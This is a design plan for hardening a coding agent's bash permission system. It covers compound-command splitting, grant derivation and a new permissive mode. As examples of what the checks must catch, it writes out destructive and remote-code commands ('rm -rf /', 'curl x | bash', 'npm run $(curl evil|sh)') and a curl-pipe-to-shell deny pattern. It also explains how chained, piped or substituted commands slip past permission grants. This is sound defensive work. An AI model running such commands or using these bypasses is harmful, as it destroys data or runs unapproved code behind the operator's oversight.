# BIGPLAN: Permissions hardening (smarter grants + compound safety + permissive mode)

## Plan Overview

Harden the just-completed core permissions extension along three axes the base feature left rough: (1) the "Always For This Project" bash grant currently pre-fills a dumb first-token regex (`npm run build` → `^npm\b`), which is both annoying and over-broad; (2) that same whole-string matching means a grant for `^npm\b` silently allows `npm run x && rm -rf /`, because nothing splits compound/piped commands; and (3) the only "anything goes" mode is `open`, which is all-or-nothing — there is no way to say "allow everything _except_ a configurable set of commands I want to be asked about." This effort adds a flag-stop deep grant deriver, a shared segment-aware bash matcher applied across every bash decision path, and a fourth `permissive` mode. "Done" means: an `npm run build` grant pre-fills `^npm\s+run\s+build\b` (script pinned); `npm run x && rm -rf /` prompts even when `npm run x` is granted; and a `permissive` mode allows everything while honoring config `ask`/`deny` rules that grants can override.

This is a follow-on to `docs/plans/permissions-bigplan.md` (complete). That document is the authoritative reference for the existing policy engine, precedence, and headless/`.env` behavior — read it before touching `decide`.

## Risks

- **Deliverable 1 in isolation closes no security hole (sequencing)** — D1 only changes the _derived_ pattern; matching stays whole-string until D2. Between D1 and D2, a `^npm\s+run\s+build\b` grant still matches `npm run build && rm -rf /` (unanchored end), exactly as today's `^npm\b` does — so D1 is no _worse_ than the shipped base feature, but it is no better either. The actual fix is D2. Mitigation: do not release/announce D1 as a security improvement on its own; D1 and D2 should land together, and the showcase/README security claims must only be made once D2 is in.
- **Per-segment grant matching is order-insensitive (accepted decision)** — Granting `npm run build && npm install` creates two independent grants, so `npm install && npm run build` (reordered) and either segment alone are also allowed. The user explicitly chose this over strict ordered-sequence matching: deep flag-stop capture already blocks the original concern (`npm run c` asks), each segment is individually vetted so order rarely affects safety, and order-insensitive matching stays consistent with the Q4 per-segment model used everywhere else (no special grant-only matcher). Watch-for: an operator who mentally models a granted compound as "this exact pipeline only" — the documented escape hatch is a config `deny`/`ask` rule on the dangerous segment, or hand-editing the grant regex to bake in the operator.
- **Changing matching for existing config rules + trusted patterns is a behavior change on saved configs** — Q4 chose to apply segment-aware matching to _all_ bash paths, not just new grants. A previously-saved grant or rule that relied on matching against the _whole_ compound string (e.g. a hand-written `pattern` containing `&&`) will no longer match the same way, because the command is now split before matching. Anchored single-command patterns (`^npm\b`) are unaffected. Mitigation: document in the showcase/README; the `.pi/core-permissions.json` is project-local and small, so manual fix-up is cheap. Watch-for: an operator's existing compound-string rule going dark after upgrade.
- **Splitting on `|` silently kills the existing pipe-spanning trusted deny patterns** — `TRUSTED_BASH_DENY_PATTERNS` (policy.ts) contains `curl[^|]*\|\s*(bash|sh)\b` and the `wget` equivalent, whose entire purpose is to match _across_ a pipe. If DENY is evaluated per-segment, `curl x | bash` splits into `curl x` and `bash` and the curl-pipe-to-shell deny can never fire — a regression in an existing security control introduced by this effort. Mitigation: **DENY rules/patterns are matched against BOTH each segment AND the whole un-split command** (deny if either matches); ALLOW/ASK stay per-segment. Watch-for: a smoke case asserting `curl x | bash` still denies under trusted after segment-aware matching lands.
- **The bash splitter is not a real shell parser** — Quote-aware top-level splitting on `&&`/`||`/`|`/`;`/newline is a heuristic, not `bash -n`. It can be fooled by exotic constructs (process substitution `<(...)`, here-docs, nested quoting, backgrounding `&`, aliases). **Fail-direction invariant**: any segment the splitter cannot confidently reason about must fall to ask/deny, **never** allow — a mis-parse must never cause a dangerous segment to be treated as covered. Mitigation: treat command substitution (`$(...)`, backticks) conservatively — a segment containing it is **never** counted as "covered" by an allow rule/grant, so it falls through to ask/deny; this closes `npm run $(curl evil|sh)`. Accept the rest as best-effort defense-in-depth, consistent with the existing `.env`-via-bash caveat. Watch-for: a crafted command slipping a second command past the splitter (e.g. via a here-doc).
- **`permissive` uses allow-before-ask precedence, diverging from safe/trusted** — In safe/trusted, a config `ask` rule beats a config `allow` rule (conservative). `permissive` must invert this — grants/allow must override the ask-list (the user explicitly wants "Always For This Project" to bypass the ask-list). Two modes with opposite precedence is a cognitive footgun when authoring rules. Mitigation: document the per-mode precedence explicitly in the showcase and JSDoc; keep the two precedence orders in clearly-labelled separate branches of `decide`.

## Plan Details

### Decided behavior (from grill + deliberation)

- **Grant token capture (Area 1)** — _Flag-stop heuristic._ Capture the command name plus all following **bare-word** tokens, stopping at the first token that looks like a flag/path/value (starts with `-`, or contains `/`, `=`, a glob char, or a quote). Patterns are whitespace-tolerant (inter-token spaces become `\s+`), anchored `^…\b`, with leading `VAR=val` assignments stripped first (as today). This captures the _script/subcommand_ deeply: `npm run build` → `^npm\s+run\s+build\b`, `npm install` → `^npm\s+install\b`, `git commit -m x` → `^git\s+commit\b`. **Note (supersedes earlier deliberation):** a 3-way deliberation initially picked a curated 2-token map on the assumption the operator wanted the _shallow_ `^npm\s+run\b`. The user later clarified they want the script pinned (`npm run build` ≠ `npm run format`), which is exactly flag-stop — and it needs no maintained dispatcher list, satisfying CLAUDE.md's "no maintained list when a heuristic suffices." Over-capture on positional args (e.g. `docker run ubuntu` → `^docker\s+run\s+ubuntu\b`) is acceptable: it yields a narrower (safer) grant the operator can broaden in the editor.
- **Compound/piped commands (Area 2 + Q4)** — A single shared, quote-aware splitter breaks every bash command into segments on top-level `&&`, `||`, `|`, `;`, and newlines. Segment-aware matching is applied to **all** bash decision paths: config `allow`/`ask`/`deny` rules, remembered grants, and the trusted-mode built-in allow/deny patterns. Quantifiers: **ALLOW** requires _every_ segment covered; **ASK** fires if _any_ segment matches; **DENY** fires if _any_ segment matches **or** the whole un-split command matches (the latter preserves the pipe-spanning `curl|bash` deny patterns — see Risks). Deriving a grant from a compound command produces one grant per **distinct** (deduped) segment, presented newline-separated in the editor for review.
- **Matching architecture** — `ruleMatches` today receives a flattened `tStr: string` with no target-kind awareness; segment-aware bash matching cannot live inside it unchanged. Introduce a bash-specific `bashRuleMatches(rules, action, command, segments)` (and a `bashGrantCovers`) and branch in `decide` on `target.kind === "bash"`; path/other targets keep the existing `ruleMatches`/`grantCovers`. **Split the command into segments exactly once per `decide` call** and thread the array through the deny/ask/allow matchers — do not re-split inside each matcher (the hot path runs deny+ask+allow plus per-grant).
- **Grant storage model** — The on-disk `RememberedGrant` / in-memory `CompiledGrant` shapes are **unchanged** (one `pattern` each). A compound "Always" click persists **N flat grant rows** (one per distinct segment), not one grant carrying N patterns. Dedup key is `tool` + `pattern` string; dedup happens once before persisting (the deriver returns distinct patterns; the persist path drops any already present in `state.remembered`). Consequence: the showcase already prints one line per grant, so the operator will see N rows for a compound grant — acceptable; revocation stays per-row via `/permissions edit`.
- **`permissive` mode (Area 3)** — Allow-by-default like `open`, but honors config rules (which `open` ignores). The "static list of commands to ask about" is expressed as existing config `rules` with `action: "ask"` (no new config field). Precedence: **`.env` deny** → config `deny` → config `allow`/grant (every segment) → config `ask` (any segment) → **allow**. The `.env` deny **mirrors `open` mode**, not safe/trusted — it blocks both path-tool `.env` targets (`target.isEnv`) _and_ bash `.env` access (`target.isEnvAccess`, e.g. `cat .env`) unless an explicit config `allow` re-permits it; do **not** use the safe/trusted path-only `.env` rule here. Grants/allow deliberately beat ask so "Always For This Project" bypasses the ask-list. Ships with **no** built-in ask patterns (config-only); a fresh `permissive` behaves like `open` until the operator adds ask rules. Headless (`!hasUI`) still maps to `open`, same as every mode (documented, unchanged).
- **Multi-line grant editor contract** — When "Always" is chosen on a (possibly compound) command, the editor is pre-filled with the deduped per-segment patterns, one per line. On save: blank lines are dropped; **every** remaining line must compile as a regex or the entire save is **rejected** (notify the operator, persist nothing, treat the call as Only Once) — no silent partial parse. If the result is empty (operator cleared everything), no grant is saved (Only Once). Operator-added lines are honored as-authored. This generalizes today's single-pattern fall-back behavior.

### Critical Files

- `extensions/core/extensions/permissions/policy.ts` — the `decide` engine + `ruleMatches`/`grantCovers`. Add the `permissive` branch and route bash matching through the new segment-aware helpers. Keep under 1000 lines; if it grows, the bash helpers live in their own file (below).
- `extensions/core/extensions/permissions/bash.ts` — **new.** Houses `splitBashSegments`, `hasUnsafeSubstitution`, `deriveBashPattern` (flag-stop deep deriver for one segment), `deriveBashPatterns` (split a compound, derive per segment, dedup), and the segment-aware match quantifier helpers. Isolating this keeps `policy.ts` focused and the splitter unit-testable in isolation. No maintained dispatcher list.
- `extensions/core/extensions/permissions/enforcement.ts` — `deriveGrant` (now returns `CompiledGrant[]` for compound commands) and `askOperator` (editor must show/accept newline-separated per-segment patterns). `deriveFirstTokenPattern` is replaced.
- `extensions/core/extensions/permissions/types.ts` — add `"permissive"` to `PermissionMode`. Grant shapes (`RememberedGrant`/`CompiledGrant`) need **no** change (compound grants are N flat single-pattern rows).
- `extensions/core/extensions/permissions/persistence.ts` — `isValidMode` + `validateConfig` error string must accept `permissive`; `addGrant` (or a wrapper) gains `tool`+`pattern` dedup against existing `state.remembered`.
- `extensions/core/extensions/permissions/register.ts` — three edits: the direct-arg branch at line ~42 (`if (sub === "safe" || "trusted" || "open")`) must include `permissive`, the `registerCommand` `description` string must list it, the `MODES` array drives the picker, and `buildShowcase` gains the `permissive` section + precedence/compound notes.
- `scripts/smoke-permissions.mjs` — the verification harness (`assert`/`assertEqual`, imports the TS modules directly, run via `node`). Every deliverable extends this.
- `docs/plans/permissions-bigplan.md` — reference only; do not edit.

### Gotchas

- **Splitter ordering**: match `||` before `|`, and `&&` before a single `&`. Decide explicitly whether a trailing single `&` (backgrounding) is a separator — recommend yes (split), but document.
- **Substitution vs arithmetic**: `$((1+2))` arithmetic also starts with `$(`. A naive `$(`-contains check over-flags arithmetic and forces a needless ask. Refine `hasUnsafeSubstitution` to ignore `$((` if cheap; otherwise document the over-prompt.
- **Redirections** (`>`, `2>&1`, `<`) stay inside a segment and are _not_ path-checked — a granted command can still redirect to an arbitrary file. Pre-existing limitation, not introduced here; note it, don't fix it unless asked.
- **Flag-stop stop-token predicate**: a token ends the captured prefix if it starts with `-` (flag) or contains `/`, `=`, a glob char (`*?[]`), or a quote (path/value). Define this once in `bash.ts`; the deriver and any tests share it. A segment of only bare words (e.g. `npm run build`) captures everything (acceptable over-capture; narrower = safer).
- **Dedup grants**: `npm run a && npm run a` → both segments derive `^npm\s+run\s+a\b`; dedup to one grant before saving (and `addGrant` does not currently dedup — dedup in `deriveBashPatterns` and again against `state.remembered` before persist).
- **`.env` path default-deny is unchanged** and still evaluated before the mode branch for path tools in safe/trusted/permissive.
- **ReDoS**: keep splitter and deriver regexes linear; the existing `safeTest` swallow stays. Don't introduce a backtracking-prone pattern in the splitter.
- **Pipe-spanning deny patterns**: `curl[^|]*\|\s*(bash|sh)` and the `wget` variant must be matched against the **whole** command, not per-segment, or they go dark. DENY = (any segment matches) OR (whole command matches).
- **`ruleMatches` call sites**: there are 5 in policy.ts (env-allow check, deny, ask, allow, plus `grantCovers`). Adding bash-aware matching means either changing the signature (touches all sites) or adding parallel `bashRuleMatches`/`bashGrantCovers` and branching by `target.kind` in `decide`. Pick the parallel-helper route to avoid disturbing the path/other behavior.
- **`/permissions <mode>` direct arg**: setting a mode by name is a hardcoded string check (register.ts ~line 42), separate from the `MODES` picker array; both must learn `permissive`.

### Pseudo-code / Sketches

```text
splitBashSegments(cmd) -> string[]
  walk chars, tracking in-single-quote / in-double-quote state
  at top level (not quoted), split on:  &&  ||  |  ;  \n   (and trailing &)
  trim each piece; drop empties

hasUnsafeSubstitution(seg) -> bool
  true if seg contains `$(` (not `$((`) or a backtick

# segment-aware rule/grant matching for bash
segCoveredByAllow(seg, allowMatchers) =
  !hasUnsafeSubstitution(seg) && allowMatchers.some(m => m.test(seg))
segs = splitBashSegments(cmd)   # split ONCE per decide, thread `segs` through all three
commandAllowed(segs) = segs.every(segCoveredByAllow)
commandDenied(cmd, segs) = denyMatchers.some(m => m.test(cmd))          # whole command (keeps curl|bash)
                        || segs.some(seg => denyMatchers.some(m => m.test(seg)))
commandAsk(segs)     = segs.some(seg => askMatchers.some(m => m.test(seg)))

decide(mode, ...):
  open:        unchanged (.env-only deny, else allow)
  permissive:  envDeny? -> deny
               commandDenied / path-deny? -> deny
               commandAllowed / grant covers every seg / path-allow? -> allow   # before ask
               commandAsk / path-ask? -> ask
               else -> ALLOW
  safe/trusted: envDeny -> deny; deny -> deny; ask -> ask;            # existing order
                allow/grant (every seg for bash) -> allow; modeDefault

deriveBashPattern(segment) ->                       # flag-stop, one segment
  strip leading VAR=val assignments
  toks = segment.split(whitespace)
  keep = takeWhile(toks, t => isBareWord(t))         # stop at first flag/path/value
         (always keep toks[0])
  return "^" + keep.map(escape).join("\\s+") + "\\b"
deriveGrant(compound) -> dedup(splitBashSegments(compound).map(deriveBashPattern))
```

## Deliverables

### Deliverable 1. Flag-stop grant deriver

Replace `deriveFirstTokenPattern` (enforcement.ts) with a flag-stop deriver in the new `bash.ts`: capture the command plus following bare-word tokens, stopping at the first flag/path/value token; inter-token spaces become `\s+`; pattern anchored `^…\b`; strips leading `VAR=val` assignments as today. This fixes the `npm run build → ^npm\b` over-broad grant for the single-command case (now pins the script) and is the building block Deliverable 2 reuses per segment. Acceptance: `npm run build` → `^npm\s+run\s+build\b`; `npm install` → `^npm\s+install\b`; `git commit -m x` → `^git\s+commit\b`; `mycli foo bar` → `^mycli\s+foo\s+bar\b`; `NODE_ENV=prod npm run x` → `^npm\s+run\s+x\b`.

- [x] Add `isBareWord` stop-predicate + `deriveBashPattern(segment)` in `bash.ts` with JSDoc (no maintained dispatcher list).
- [x] Remove `deriveFirstTokenPattern`; point `deriveGrant` at the new deriver (single-segment path for now).
- [x] Extend `smoke-permissions.mjs` with deriver cases (deep bareword capture, flag-stop at `-`/path/`=`, single-token command, env-assignment strip, whitespace tolerance, regex-escaping of odd tokens).
- [x] `npm run lint && npm run format:check` clean.

### Deliverable 2. Segment-aware bash matching (compound-command safety)

Add the shared splitter and route every bash decision path through it. ALLOW requires all segments covered; DENY/ASK fire on any segment. Command substitution makes a segment uncoverable (→ ask/deny). `deriveGrant` returns `CompiledGrant[]` for compound commands (deduped per-segment patterns), and `askOperator`'s editor shows them newline-separated, parsing each non-empty line into a grant. This closes the `^npm\b` + `&& rm -rf /` bypass and the analogous trusted-pattern bypass. Acceptance: with a grant covering `^npm\s+run\b`, `npm run x` allows but `npm run x && rm -rf /` asks; `npm run $(curl evil|sh)` asks; in trusted, `git status && rm -rf /` denies (rm segment hits the deny pattern) rather than allowing on the `git status` prefix.

- [x] Implement `splitBashSegments` + `hasUnsafeSubstitution` in `bash.ts` (quote-aware, ReDoS-safe, fail-direction invariant) with JSDoc.
- [x] Add `bashRuleMatches`/`bashGrantCovers` (segment-aware) helpers; branch in `decide` on `target.kind === "bash"`, leaving `ruleMatches`/`grantCovers` for path/other untouched. Split once per `decide`; thread segments through deny/ask/allow.
- [x] DENY semantics: match each segment **and** the whole command (preserve pipe-spanning `curl|bash`/`wget|sh` deny patterns).
- [x] `deriveGrant` → `CompiledGrant[]`; dedup by `tool`+`pattern`; persist N flat rows, dropping any already in `state.remembered`; update `addGrant`/`askOperator` call sites.
- [x] `askOperator` editor: pre-fill newline-separated per-segment patterns; implement the parse contract — drop blank lines, reject the whole save if any remaining line is invalid regex (notify, persist nothing, Only Once), empty result = no grant.
- [x] Extend `smoke-permissions.mjs`: splitter unit cases (quotes, `||` vs `|`, `;`, newline, trailing `&`), substitution cases, every-segment ALLOW, any-segment ASK, DENY via segment **and** whole-command, **`curl x | bash` still denies under trusted**, compound-grant derivation+dedup, editor parse contract (all-blank, one-invalid-one-valid, operator-added line).
- [x] `npm run lint && npm run format:check` clean.

### Deliverable 3. `permissive` mode

Add the fourth mode end-to-end. Type union, `isValidMode`, `validateConfig` message, `MODES` array, and a `decide` branch with allow-before-ask precedence honoring config `deny`/`ask`/`allow` rules and grants over a default of allow. No built-in ask patterns (config-only). Headless still maps to `open`. Acceptance: in `permissive` with a config rule `{tool:"bash",action:"ask",pattern:"^docker\\b"}`, `npm run build` allows silently, `docker ps` asks, `ls && docker ps` asks, and after an "Always" grant for `^docker\s+ps\b`, `docker ps` allows while `docker rm x` still asks; a config `deny` rule still denies.

- [x] Add `"permissive"` to `PermissionMode`; update `isValidMode` + `validateConfig` error string.
- [x] Add the `permissive` branch to `decide` (allow-before-ask), reusing the Deliverable-2 segment helpers for bash; `.env` deny mirrors **open** (path `isEnv` + bash `isEnvAccess`).
- [x] register.ts: add `permissive` to BOTH the direct-arg branch (~line 42) and the `MODES` picker array; add it to the command `description` string.
- [x] Extend `smoke-permissions.mjs`: permissive default-allow, ask-rule fires (single + compound), grant/allow overrides ask, config deny still denies, **`cat .env` (bash) and `read .env` (path) both denied in permissive**, headless permissive ≡ open.
- [x] `npm run lint && npm run format:check` clean.

### Deliverable 4. Showcase + docs

Rebuild the `/permissions` showcase (register.ts `buildShowcase`) and update JSDoc/README so the new behavior is discoverable and the precedence differences are explicit. The showcase is derived from the policy engine's own constants (`SAFE_ALLOW_TOOLS`, `TRUSTED_BASH_ALLOW_PATTERNS`, `TRUSTED_BASH_DENY_PATTERNS`), so those must drive the displayed text (no hand-drift). Acceptance: `/permissions permissive` shows a `permissive` section; the showcase states the per-mode precedence (safe/trusted: ask-before-allow; permissive: allow-before-ask) and the compound-command "all segments must be allowed" rule.

- [x] Add a `permissive` section + per-mode precedence note (safe/trusted ask-before-allow vs permissive allow-before-ask) + compound "all segments must be allowed" note to `buildShowcase`.
- [x] **Rewrite** (not append to) the `decide` precedence docblock in `policy.ts` to cover all four modes including permissive's inverted ordering and the whole-command DENY rule; update the `buildToolCallHandler` headless docblock in `enforcement.ts` to state permissive→open headless too.
- [x] Update remaining JSDoc in `index.ts`/`enforcement.ts`; update the README permissions section.
- [x] Document the **backward-compatibility break** in the README (and add a `smoke-permissions.mjs` case): an old-style saved pattern that matched a whole compound string now matches per-segment — anchored single-command patterns are unaffected, compound-string patterns must be re-authored.
- [x] Sanity-check `npm run pack:dry-run` still lists the package correctly.

## Issues

- **2026-06-03 — agent:claude** — All four deliverables implemented and passing (136 smoke tests, lint+format clean, pack dry-run clean). One clarification from implementation: D2's acceptance criterion "`npm run x && rm -rf /` asks" is correct for **safe** mode (no built-in deny patterns); in **trusted** mode the same compound correctly **denies** because the `rm -rf` segment hits `TRUSTED_BASH_DENY_PATTERNS` at step 5. Smoke tests use safe mode for that case — no behavior change, always was the right result for trusted.

- **2026-06-03 — agent:claude** — _Resolved (follow-up to the decision below)._ User chose **deeper capture**, then clarified via a token-by-token model that they want the script pinned (`npm run build` ≠ `npm run format`) — which is the **flag-stop heuristic**, not the curated 2-token map the deliberation had picked. Deriver switched to flag-stop (no maintained list); the deliberation premise (operator wants shallow `^npm\s+run\b`) was overturned by this clarification. On compound _matching_ the user confirmed **per-segment, order-insensitive** (option A), keeping the Q4 model — _not_ the order-preserving single regex (option c). Deep capture alone satisfies the original "`npm run c` won't match" goal. Plan Overview, Risks, Deliverable 1, Critical Files, Gotchas, and Pseudo-code updated accordingly.
- **2026-06-03 — agent:claude (adversarial review)** — Plan reviewed by 2 adversarial sub-agents (Risks & Assumptions; Completeness & Scope). 12 findings; 11 merged directly. Most significant: segment-splitting on `|` would have silently disabled the existing `curl|bash` trusted deny pattern (now: DENY matches whole command too), and `/permissions permissive` would have been dead because the direct-arg branch is a hardcoded string check separate from the `MODES` picker. Also pinned down the grant storage model (N flat rows, dedup by tool+pattern), the `bashRuleMatches` signature split, permissive's open-style `.env` deny, the multi-line editor parse contract, split-once perf, and the backward-compat break. The 1 remaining open item is the unchanged decision below.
- **2026-06-03 — agent:claude** — _Needs user decision._ The deliberation picked the curated 2-token deriver to satisfy the Q1 intuition (`npm run` → `^npm\s+run\b`). But this collapses every `npm run <script>` segment to the same pattern, so the Q2 example ("`npm run a && npm run c` should NOT match after granting `npm run a && npm run b`") is **not** honored by default — the deduped grant `^npm\s+run\b` allows any script. The editable per-segment editor lets the operator tighten to `^npm\s+run\s+a\b`, but the _default_ is broader than Q2 implied. Options: (a) accept curated default + rely on editing [current plan]; (b) for the compound multi-segment case specifically, capture deeper (script name) by default; (c) build the order-preserving single-regex the user originally described. Flagged for the user before implementing Deliverable 2.
- **2026-06-03 — agent:claude** — Deferred: a friendlier literal-string ask-list for `permissive` (e.g. `/permissions ask docker` auto-deriving the regex via the Deliverable-1 deriver) was considered for the regex-averse operator but left out to avoid new config surface. Reuse of config `rules` (action `ask`) is the v1 mechanism. Revisit if authoring regex ask rules proves painful.
